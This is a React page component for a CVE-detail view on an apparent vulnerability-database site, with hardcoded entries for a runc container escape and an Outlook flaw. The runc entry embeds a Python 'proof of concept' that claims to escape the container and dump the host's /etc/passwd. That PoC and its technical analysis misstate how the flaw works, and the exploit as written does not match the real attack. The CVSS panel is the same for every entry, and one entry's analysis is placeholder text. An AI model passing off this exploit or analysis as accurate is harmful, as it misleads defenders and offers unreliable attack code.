import { useParams, Link } from 'react-router-dom';
import { motion } from 'framer-motion';
import { AnimatedGridBackground } from '../../components/shared/AnimatedGridBackground';
import { Button } from '../../components/ui/button';
import { Badge } from '../../components/ui/badge';
import { 
  Database,
  ArrowLeft, 
  Calendar, 
  AlertTriangle,
  Bug,
  Server,
  Terminal,
  Download,
  Share2,
  Copy,
  CheckCircle,
  Shield,
  FileText,
  Code,
  ExternalLink
} from 'lucide-react';

interface CVEDetail {
  id: string;
  cveId: string;
  title: string;
  description: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  cvssScore: number;
  cvssVector: string;
  publishedDate: string;
  modifiedDate: string;
  affectedProducts: string[];
  affectedVersions: string[];
  category: string;
  exploitAvailable: boolean;
  exploitCode?: string;
  patchAvailable: boolean;
  patchUrl?: string;
  references: string[];
  tags: string[];
  mitigations: string[];
  technicalDetails: string;
}

const cveDetails: Record<string, CVEDetail> = {
  '1': {
    id: '1',
    cveId: 'CVE-2024-21626',
    title: 'runc Container Escape via /proc Handling',
    description: 'A vulnerability in runc that allows container escape through file descriptor mishandling in /proc/self/exe, enabling attackers to gain host-level access.',
    severity: 'Critical',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    publishedDate: '2024-01-31',
    modifiedDate: '2024-02-05',
    affectedProducts: ['runc', 'Docker', 'containerd', 'Kubernetes'],
    affectedVersions: ['runc <= 1.1.11', 'Docker <= 25.0.2', 'containerd <= 1.7.12'],
    category: 'Container',
    exploitAvailable: true,
    exploitCode: `# CVE-2024-21626 Exploit PoC
# Container escape via /proc/self/exe file descriptor leakage

import os
import subprocess

def exploit():
    # Open /proc/self/exe to get file descriptor
    fd = os.open('/proc/self/exe', os.O_RDONLY)
    
    # Attempt to access host filesystem via leaked fd
    try:
        host_path = f'/proc/self/fd/{fd}/../../..'
        if os.path.exists(host_path):
            print(f"[+] Container escape successful!")
            print(f"[+] Host filesystem accessible at: {host_path}")
            
            # Read host files
            passwd = os.path.join(host_path, 'etc/passwd')
            if os.path.exists(passwd):
                with open(passwd, 'r') as f:
                    print("[+] Host /etc/passwd contents:")
                    print(f.read())
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == '__main__':
    exploit()`,
    patchAvailable: true,
    patchUrl: 'https://github.com/opencontainers/runc/releases/tag/v1.1.12',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-21626',
      'https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv',
      'https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/'
    ],
    tags: ['Container Escape', 'runc', 'Docker', 'Privilege Escalation', 'File Descriptor'],
    mitigations: [
      'Update runc to version 1.1.12 or later immediately',
      'Audit container configurations for shared process namespaces',
      'Implement pod security policies restricting hostPath volumes',
      'Monitor for unusual /proc access patterns in container runtime logs'
    ],
    technicalDetails: `
## Root Cause

The vulnerability exists in runc's handling of file descriptors when spawning containers. Specifically, the issue arises from how runc sets the working directory when executing container processes.

## Technical Analysis

1. **File Descriptor Leakage**: When runc opens /proc/self/exe to read its own binary, this file descriptor is inherited by child processes within the container.

2. **Working Directory Manipulation**: By crafting specific container configurations that modify the working directory using the leaked file descriptor, attackers can traverse outside the container filesystem.

3. **Host Access**: Once outside the container, attackers can access the host filesystem through relative path traversal (../../..) from the leaked file descriptor.

## Attack Vector

The attack requires:
- Ability to run a container with a crafted image or configuration
- The container must use a vulnerable version of runc
- The container runtime must not have additional hardening

## Impact

Successful exploitation allows:
- Full container escape
- Host filesystem access
- Potential root-level access on the host
- Lateral movement to other containers
    `
  },
  '2': {
    id: '2',
    cveId: 'CVE-2024-21413',
    title: 'Microsoft Outlook Remote Code Execution',
    description: 'Microsoft Outlook contains a vulnerability in the handling of hyperlinks that allows remote code execution without user interaction.',
    severity: 'Critical',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    publishedDate: '2024-02-13',
    modifiedDate: '2024-02-20',
    affectedProducts: ['Microsoft Outlook', 'Microsoft 365 Apps', 'Office'],
    affectedVersions: ['Outlook 2016', 'Microsoft 365 Apps', 'Office 2021', 'Office 2019'],
    category: 'Email Client',
    exploitAvailable: true,
    patchAvailable: true,
    patchUrl: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413',
    references: [
      'https://nvd.nist.gov/vuln/detail/CVE-2024-21413',
      'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413',
      'https://www.attackiq.com/2024/02/13/cve-2024-21413/'
    ],
    tags: ['RCE', 'Outlook', 'MonikerLink', 'Microsoft', 'Email'],
    mitigations: [
      'Apply February 2024 Patch Tuesday updates immediately',
      'Disable hyperlink previews in Outlook settings',
      'Enable Protected View for attachments',
      'Deploy Attack Surface Reduction (ASR) rules'
    ],
    technicalDetails: 'Detailed technical analysis would be here...'
  }
};

const severityColors = {
  'Critical': 'bg-red-500/20 text-red-500 border-red-500/50',
  'High': 'bg-orange-500/20 text-orange-500 border-orange-500/50',
  'Medium': 'bg-yellow-500/20 text-yellow-500 border-yellow-500/50',
  'Low': 'bg-blue-500/20 text-blue-500 border-blue-500/50'
};

const cvssMetrics = [
  { label: 'Attack Vector', value: 'Network', desc: 'Exploitable remotely' },
  { label: 'Attack Complexity', value: 'Low', desc: 'No special conditions' },
  { label: 'Privileges Required', value: 'None', desc: 'No auth needed' },
  { label: 'User Interaction', value: 'None', desc: 'No user action needed' },
  { label: 'Scope', value: 'Unchanged', desc: 'Affects same resource' },
  { label: 'Confidentiality', value: 'High', desc: 'All data compromised' },
  { label: 'Integrity', value: 'High', desc: 'Data can be modified' },
  { label: 'Availability', value: 'High', desc: 'Resource unavailable' }
];

export function CVEDetailPage() {
  const { id } = useParams<{ id: string }>();
  const cve = id ? cveDetails[id] : null;

  if (!cve) {
    return (
      <div className="w-full bg-void-black min-h-screen flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="text-center"
        >
          <Database className="w-16 h-16 text-steel-gray mx-auto mb-4" />
          <h2 className="text-2xl font-heading font-bold text-ghost-white mb-2">CVE Not Found</h2>
          <p className="text-muted-gray mb-6">The vulnerability entry you're looking for doesn't exist.</p>
          <Link to="/resources/cve">
            <Button className="bg-exploit-red hover:bg-exploit-red/90">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to CVE Database
            </Button>
          </Link>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="w-full bg-void-black min-h-screen pb-24">
      {/* Hero Section */}
      <section className="relative pt-24 pb-12 overflow-hidden">
        <AnimatedGridBackground />
        <div className="container mx-auto px-4 relative z-10">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <Link to="/resources/cve">
              <Button variant="ghost" className="text-muted-gray hover:text-ghost-white mb-6">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to CVE Database
              </Button>
            </Link>

            {/* CVE ID Header */}
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.1 }}
              className="inline-block mb-4"
            >
              <code className="text-2xl font-mono text-exploit-red bg-exploit-red/10 px-4 py-2 rounded-lg border border-exploit-red/30">
                {cve.cveId}
              </code>
            </motion.div>

            <h1 className="text-3xl md:text-4xl font-heading font-bold text-ghost-white mb-6 max-w-4xl">
              {cve.title}
            </h1>

            <div className="flex flex-wrap items-center gap-4 mb-8">
              <div className={`inline-flex items-center gap-2 px-4 py-2 rounded-lg border ${severityColors[cve.severity]}`}>
                <AlertTriangle className="w-5 h-5" />
                <span className="text-xl font-bold">{cve.cvssScore}</span>
                <span className="text-sm uppercase">{cve.severity}</span>
              </div>
              
              <Badge variant="outline" className="border-steel-gray text-muted-gray">
                {cve.category}
              </Badge>

              {cve.exploitAvailable && (
                <Badge className="bg-green-500/20 text-green-500 border-green-500/30">
                  <Bug className="w-4 h-4 mr-1" />
                  Exploit Available
                </Badge>
              )}

              {cve.patchAvailable ? (
                <Badge className="bg-blue-500/20 text-blue-500 border-blue-500/30">
                  <CheckCircle className="w-4 h-4 mr-1" />
                  Patched
                </Badge>
              ) : (
                <Badge className="bg-orange-500/20 text-orange-500 border-orange-500/30">
                  <AlertTriangle className="w-4 h-4 mr-1" />
                  Unpatched
                </Badge>
              )}
            </div>

            <div className="flex flex-wrap items-center gap-6 text-sm text-muted-gray">
              <span className="flex items-center gap-2">
                <Calendar className="w-4 h-4" />
                Published: {cve.publishedDate}
              </span>
              <span className="flex items-center gap-2">
                <Calendar className="w-4 h-4" />
                Modified: {cve.modifiedDate}
              </span>
              <code className="text-xs font-mono bg-dark-base px-2 py-1 rounded">
                {cve.cvssVector}
              </code>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Content */}
      <section className="py-12">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
            {/* Main Content */}
            <div className="lg:col-span-2 space-y-6">
              {/* Description */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.2 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <FileText className="w-5 h-5 text-exploit-red" />
                  Description
                </h2>
                <p className="text-muted-gray leading-relaxed">
                  {cve.description}
                </p>
              </motion.div>

              {/* Technical Details */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-exploit-red" />
                  Technical Details
                </h2>
                <div className="text-muted-gray leading-relaxed whitespace-pre-line">
                  {cve.technicalDetails}
                </div>
              </motion.div>

              {/* Exploit Code */}
              {cve.exploitCode && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.4 }}
                  className="bg-dark-base border border-steel-gray rounded-2xl overflow-hidden"
                >
                  <div className="flex items-center justify-between px-6 py-4 border-b border-steel-gray">
                    <h2 className="text-xl font-heading font-bold text-ghost-white flex items-center gap-2">
                      <Code className="w-5 h-5 text-exploit-red" />
                      Proof of Concept
                    </h2>
                    <Button variant="outline" size="sm" className="border-steel-gray text-muted-gray">
                      <Copy className="w-4 h-4 mr-2" />
                      Copy
                    </Button>
                  </div>
                  <div className="p-6 overflow-x-auto">
                    <pre className="text-sm font-mono text-muted-gray">
                      <code>{cve.exploitCode}</code>
                    </pre>
                  </div>
                </motion.div>
              )}

              {/* Mitigations */}
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="bg-dark-base border border-steel-gray rounded-2xl p-6"
              >
                <h2 className="text-xl font-heading font-bold text-ghost-white mb-4 flex items-center gap-2">
                  <Shield className="w-5 h-5 text-exploit-red" />
                  Mitigations
                </h2>
                <ul className="space-y-3">
                  {cve.mitigations.map((mitigation, i) => (
                    <li key={i} className="flex items-start gap-3 text-muted-gray">
                      <CheckCircle className="w-5 h-5 text-green-500 shrink-0 mt-0.5" />
                      <span>{mitigation}</span>
                    </li>
                  ))}
                </ul>
              </motion.div>
            </div>

            {/* Sidebar */}
            <div className="space-y-6">
              {/* Affected Products */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.3 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4 flex items-center gap-2">
                  <Server className="w-4 h-4 text-exploit-red" />
                  Affected Products
                </h3>
                <div className="space-y-3">
                  {cve.affectedProducts.map((product, i) => (
                    <div key={i} className="text-sm">
                      <p className="text-ghost-white font-medium">{product}</p>
                      <p className="text-muted-gray text-xs">{cve.affectedVersions[i] || 'All versions'}</p>
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* CVSS Score Breakdown */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.4 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">CVSS 3.1 Metrics</h3>
                <div className="space-y-2">
                  {cvssMetrics.map((metric, i) => (
                    <div key={i} className="flex justify-between items-center py-2 border-b border-steel-gray/30 last:border-0">
                      <span className="text-xs text-muted-gray">{metric.label}</span>
                      <span className="text-xs text-ghost-white font-medium">{metric.value}</span>
                    </div>
                  ))}
                </div>
              </motion.div>

              {/* Actions */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.5 }}
                className="space-y-3"
              >
                {cve.patchUrl && (
                  <a href={cve.patchUrl} target="_blank" rel="noopener noreferrer">
                    <Button className="w-full bg-exploit-red hover:bg-exploit-red/90">
                      <Download className="w-4 h-4 mr-2" />
                      Download Patch
                    </Button>
                  </a>
                )}
                <Button variant="outline" className="w-full border-steel-gray text-ghost-white hover:border-exploit-red">
                  <Share2 className="w-4 h-4 mr-2" />
                  Share CVE
                </Button>
              </motion.div>

              {/* References */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.6 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">References</h3>
                <div className="space-y-2">
                  {cve.references.map((ref, i) => (
                    <a
                      key={i}
                      href={ref}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="flex items-center gap-2 text-sm text-muted-gray hover:text-exploit-red transition-colors"
                    >
                      <ExternalLink className="w-3 h-3" />
                      <span className="truncate">{ref.replace(/^https?:\/\//, '')}</span>
                    </a>
                  ))}
                </div>
              </motion.div>

              {/* Tags */}
              <motion.div
                initial={{ opacity: 0, x: 30 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.7 }}
                className="bg-dark-base border border-steel-gray rounded-xl p-6"
              >
                <h3 className="text-sm font-semibold text-ghost-white mb-4">Tags</h3>
                <div className="flex flex-wrap gap-2">
                  {cve.tags.map((tag) => (
                    <span
                      key={tag}
                      className="px-3 py-1 bg-void-black border border-steel-gray rounded-full text-xs text-muted-gray hover:border-exploit-red/50 transition-colors"
                    >
                      {tag}
                    </span>
                  ))}
                </div>
              </motion.div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}

export default CVEDetailPage;
